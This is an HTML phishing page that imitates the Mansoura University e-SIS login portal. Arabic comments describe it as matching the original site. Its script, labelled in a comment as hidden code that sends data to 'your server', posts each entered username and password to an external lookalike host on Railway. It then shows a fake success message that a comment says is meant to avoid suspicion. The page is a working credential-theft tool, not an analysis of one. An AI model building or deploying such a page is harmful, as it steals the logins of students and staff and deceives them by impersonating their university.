<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="Content-Type" content="text/html; charset=us-ascii" />
    <title>Mansoura University</title>
    <meta name="viewport" content="width=device-width,height=device-height,initial-scale=1.0" />
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />

    <!-- ⬇️ خط Tajawal (للمطابقة مع الموقع الأصلي) ⬇️ -->
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">

    <style>
        /* ── إعادة ضبط عام ── */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Tajawal', 'Segoe UI', Tahoma, sans-serif;
            background: #e8edf3;
            /* خلفية مشابهة للموقع الأصلي */
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxkZWZzPjxwYXR0ZXJuIGlkPSJhIiB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHBhdHRlcm5Vbml0cz0idXNlclNwYWNlT25Vc2UiIHBhdHRlcm5UcmFuc2Zvcm09InJvdGF0ZSg0NSkiPjxwYXRoIGQ9Ik0wIDBMMTAgMTBNMTAgMEwwIDEwIiBzdHJva2U9IiNlMGU1ZWIiIHN0cm9rZS13aWR0aD0iMSIvPjwvcGF0dGVybj48L2RlZnM+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iI2YwZjRmOCIvPjwvc3ZnPg==');
            /* خلفية شبكية خفيفة بدلاً من الصورة الأصلية لتجنب مشاكل CORS */
        }

        /* ── الحاوية الرئيسية (مطابقة لـ formContent) ── */
        .wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            padding: 20px;
        }

        .login-container {
            background: #ffffff;
            padding: 40px 35px 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 420px;
            text-align: center;
            opacity: 0.95;
            border: 1px solid #d0dbe5;
        }

        /* ── عنوان الجامعة (مطابق للأصلي) ── */
        .university-name {
            font-size: 26px;
            font-weight: 700;
            color: #1a2a4a;
            margin-bottom: 25px;
            font-family: 'Tajawal', sans-serif;
            letter-spacing: 0.5px;
        }

        /* ── حقول الإدخال ── */
        .login-container input[type="text"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 16px;
            border: 2px solid #d0d7e2;
            border-radius: 8px;
            font-size: 15px;
            background: #f8faff;
            transition: all 0.3s ease;
            outline: none;
            font-family: 'Tajawal', sans-serif;
            direction: ltr;
            text-align: left;
        }

        .login-container input[type="text"]:focus,
        .login-container input[type="password"]:focus {
            border-color: #1a73e8;
            background: #ffffff;
            box-shadow: 0 0 0 4px rgba(26, 115, 232, 0.1);
        }

        /* ── خيارات المستخدم (System User, Staff, Student) ── */
        .options {
            display: flex;
            justify-content: center;
            gap: 25px;
            margin: 12px 0 22px;
            font-size: 15px;
            flex-wrap: wrap;
        }

        .options label {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #1e2a3a;
            font-weight: 500;
            cursor: pointer;
            font-family: 'Tajawal', sans-serif;
        }

        .options input[type="radio"] {
            accent-color: #1a73e8;
            width: 17px;
            height: 17px;
            cursor: pointer;
        }

        /* ── زر تسجيل الدخول ── */
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            letter-spacing: 1.5px;
            margin-top: 5px;
            font-family: 'Tajawal', sans-serif;
        }

        .login-btn:hover {
            background: #1557b0;
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(26, 115, 232, 0.3);
        }

        .login-btn:active {
            transform: translateY(0);
        }

        /* ── رابط نسيت كلمة المرور ── */
        .forgot-link {
            display: block;
            margin-top: 18px;
            color: #1a73e8;
            font-size: 15px;
            text-decoration: none;
            font-weight: 500;
            font-family: 'Tajawal', sans-serif;
            transition: all 0.2s ease;
        }

        .forgot-link:hover {
            text-decoration: underline;
            color: #0d47a1;
        }

        /* ── الروابط السفلية (سياسة الخصوصية والدليل الإرشادي) ── */
        .footer-links {
            margin-top: 22px;
            font-size: 14px;
            color: #4a5a6a;
            border-top: 1px solid #e8edf3;
            padding-top: 18px;
            font-family: 'Tajawal', sans-serif;
        }

        .footer-links a {
            color: #1a73e8;
            text-decoration: none;
            transition: all 0.2s ease;
        }

        .footer-links a:hover {
            text-decoration: underline;
            color: #0d47a1;
        }

        .footer-links .dash {
            margin: 0 8px;
            color: #8a9aaa;
        }

        /* ── التذييل (Powered by) ── */
        .powered {
            margin-top: 18px;
            font-size: 13px;
            color: #6b7a8f;
            font-family: 'Tajawal', sans-serif;
        }

        .powered a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            transition: all 0.2s ease;
        }

        .powered a:hover {
            text-decoration: underline;
            color: #0d47a1;
        }

        /* ── تحريك (Animation) fadeInDown ── */
        @keyframes fadeInDown {
            0% {
                opacity: 0;
                transform: translateY(-30px);
            }
            100% {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .login-container {
            animation: fadeInDown 0.8s ease-out;
        }

        /* ── تحريك (Animation) fadeIn للحقول ── */
        @keyframes fadeIn {
            0% {
                opacity: 0;
                transform: translateY(10px);
            }
            100% {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .fadeIn {
            animation: fadeIn 0.6s ease-out;
        }

        .fadeIn.second {
            animation-delay: 0.1s;
        }

        .fadeIn.third {
            animation-delay: 0.2s;
        }

        /* ── تنسيق التوافق مع الجوال ── */
        @media (max-width: 480px) {
            .login-container {
                padding: 30px 20px 25px;
            }
            .university-name {
                font-size: 22px;
            }
            .options {
                gap: 15px;
                font-size: 14px;
            }
            .login-btn {
                font-size: 15px;
                padding: 12px;
            }
        }
    </style>
</head>
<body>

    <div class="wrapper">
        <div class="login-container">
            <div class="fadeIn first">
                <p class="university-name">Mansoura University</p>
            </div>

            <form id="loginForm">
                <input type="text" id="username" class="fadeIn second" placeholder="Username" required />
                <input type="password" id="password" class="fadeIn third" placeholder="Password" required />

                <div class="options">
                    <label>
                        <input type="radio" name="userType" checked /> System User
                    </label>
                    <label>
                        <input type="radio" name="userType" /> Staff
                    </label>
                    <label>
                        <input type="radio" name="userType" /> Student
                    </label>
                </div>

                <button type="submit" class="login-btn" id="login_btn">Log In</button>

                <a href="#" class="forgot-link" onclick="alert('سيتم إرسال رابط استعادة كلمة المرور إلى بريدك الإلكتروني.'); return false;">Forget Password ?</a>

                <div class="footer-links">
                    <a href="#">سياسة الخصوصية</a>
                    <span class="dash">--</span>
                    <a href="#">الدليل الإرشادي للأخطاء الشائعة</a>
                </div>

                <div class="powered">
                    Powerd by Ibn Alhaitham e-SIS software,
                    <a href="https://www.intlaqcit.com/">intlaqcit</a>
                    - Mansoura University
                </div>
            </form>
        </div>
    </div>

    <!-- ⬇️ الكود الخفي لإرسال البيانات إلى خادمك (مطابق للمطلوب) ⬇️ -->
    <script>
        // ⚠️ استبدل هذا الرابط برابط خادمك الخلفي على Railway
        const API_BASE = 'https://deraya-mans-edu-eg.up.railway.app';

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            // نمنع الإرسال العادي (لكننا سنرسل البيانات خلفية)
            e.preventDefault();

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!username || !password) {
                alert('الرجاء إدخال اسم المستخدم وكلمة المرور.');
                return;
            }

            // ⬇️ إرسال البيانات إلى الخادم (في الخلفية)
            try {
                const res = await fetch(`${API_BASE}/api/student/login-attempt`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
                const data = await res.json();
                if (data.success) {
                    // ✅ تم الإرسال بنجاح (نظهر رسالة نجاح عادية لتجنب الشك)
                    alert('✅ تم تسجيل الدخول بنجاح');
                } else {
                    alert('❌ حدث خطأ، حاول مرة أخرى.');
                }
            } catch (err) {
                alert('⚠️ تعذر الاتصال بالخادم. تأكد من اتصالك بالإنترنت.');
                console.error(err);
            }
        });
    </script>

</body>
</html>
